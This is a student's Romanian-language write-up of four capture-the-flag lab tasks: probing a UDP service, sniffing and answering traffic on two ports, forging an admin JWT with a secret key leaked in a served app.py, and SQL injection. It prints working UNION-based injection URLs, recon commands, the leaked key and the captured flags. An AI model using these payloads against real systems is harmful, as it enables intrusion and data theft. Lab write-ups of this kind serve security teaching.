    La toate taskurile folosesc 'sudo ./connect.sh', doar ca nu mai repet la
fiecare. Scripturile facute de mine au fost copiate direct pe docker, cu ex-
ceptia celor care vor fi precizate ulterior deoarece au fost introduse de mana.
Comenzile generice au fost, de obicei, gasite pe Stack Overflow sau cu ajutorul
lui ChatGPT deoarece nu intelegeam de ce imi aparea ca da o comanda fail nejus-
tificat.

# Task message-send

    Mai intai caut ip-ul la care pot scana portuile folosind 'ip addr show'.
Pe langa localhost gasesc un ip care incepe cu 10.128.x.y. Folosesc comanda
'nc -u 18 10.128.x.y' (presupun ca e conexiune de tip udp datorita hintului)
pentru a ma conecta la server. Observa ca as asteapta input si trimit ceva ar-
bitrar. Primesc un raspuns care arata asa:
    "Oh, hi there! I was told to give you this:
     SpeishFlag{Ycqdg3JLnRVXyVs3RrkZeqeOBdLrZkCO}"

# Task ghost-in-the-shell

    Hintul spune ca trebuie sa ascult, deci folosesc "tcpdump". Observ ca apare
de la 10.128.x.y.PORT catre 'shell.13939' ceva cu 'Flags [S]'. Daca folosesc
comanda 'nc l -p 13939' imi apare dupa un timp "Is there anyone here? Hey
there, can you hear me?". Presupun ca se trimite catre un alt port un mesaj ca-
re asteapta reply. Fac 'con.py' si il rulez asincron pentru a asculta cu
'tcpdump'. Observ ca se trimite spre 'shell.14726'. Modific 'con.py' si obtin
'con2.py' care se conecteaza in paralel la cele 2 porturi si obtin urmatoarele:
    "Is there anyone here? Hey there, can you hear me?
     You really really see this? Let's just try it one more time...
     Finally, here's my secret:
     SpeishFlag{aAj321UbUJPt0W1wmu1YdnIGvVGnBuiy}"

# Task jwt-auth

    Dupa ce gasesc ip-ul folosind 'ip addr show', folosesc 'nmap -p- ip_gasit'.
Observ ca am un port deschis 5000 cu adresa la 10.128.x.34. Folosesc 'ls' si
vad ca am un script numit 'webtunnel.sh' care accepta doua argumente in ordinea
ip, respectiv port. Astfel folosesc './webtunnel.sh 10.128.x.34 5000' si, in-
trand pe 'localhost:8080' pe browser observ ca am un cookie pregenerat pentru
acces. Folosind 'nikto -h localhost:8080', primesc informatia ca serverul fo-
loseste Werkzeug bazat pe Python. Deci pot accesa 'localhost:8080/app.py' care
ruleaza serverul.
    Aici gasesc un secret key "X9zs2Fv41ZwsBUnBo0hzwPyJdgvPuQNq" care ma lasa
sa trimit cereri de tip HTTP in care pot face un cont nou. Astfel, copiez din
'app.py' cum face cererea si modific astfel incat sa ii dau rol de admin modi-
ficand "isAdmin" in '1'. Dupa rularea scriptului primesc un accessToken. Mai
trimit un script in bash prin care face contul exact cum e cerut de server:
    curl -X POST http://localhost:8080/api/register \
        -H "Content-Type: application/json" \
        -d '{
            "firstName": "John",
            "lastName": "Doe",
            "email": "john.doe@example.com",
            "age": "21",
            "website": "https://johndoe.com",
            "username": "lucy",
            "password": "parola_smek",
            "confirmPassword": "Password@123"
        }'

    Dupa intru pe formularul de logare si dupa ce modific cookie-ul dau refresh
si gasesc in codul HTML:
    <p hidden="">SpeishFlag{UGCbizoeG0ea2c3nVyZiOhEJXofqB74q}</p>

# Task sqli-cart
    Dau la inceput 'nmap -p- 10.128.x.y' ca sa vad ce porturi mai am deschise.
Gasesc portul 9090 la ip-ul 10.128.z.t. Folosesc
    './webtunnel.sh 10.128.z.t 9090' si se deschid in browser localhost:8080.
    Observ cand incerc sa dau comanda ca da eroare. Ma gandesc ca pot incerca
un SQL injection. Cand se da 'fetch', in cart.js apare forma
    'add_to_cart/${product_id}'
    Folosim o interogare:
    `query = f"SELECT * FROM products WHERE id IN ({product_ids})`

    Imediat vine ideea a afisa tabelele folosind:
    http://localhost:8080/add_to_cart/5) UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master WHERE type='table'--

    Sunt afisate mai multe table, printre care si 'flagzzXHoWf'. Facem acelasi
lucru si pentru acesta dupa ce sterg cookie-ul:
    http://localhost:8080/add_to_cart/6) UNION SELECT 1, sql, 3, 4, 5 FROM sqlite_master WHERE name='flagzzXHoWf'--

    Observam ceva interesant: 'value5100'. Din nou, sterg cookie-ul, dau re-
fresh si incerc:
     http://localhost:8080/add_to_cart/7)UNION SELECT 1, value5100, 3, 4, 5 FROM flagzzXHoWf--

     Dand iar refresh, gasesc ca produs flagul:
        SpeishFlag{OSSznyblFD28xOA88BnpQt2L5m3Ptsb0}

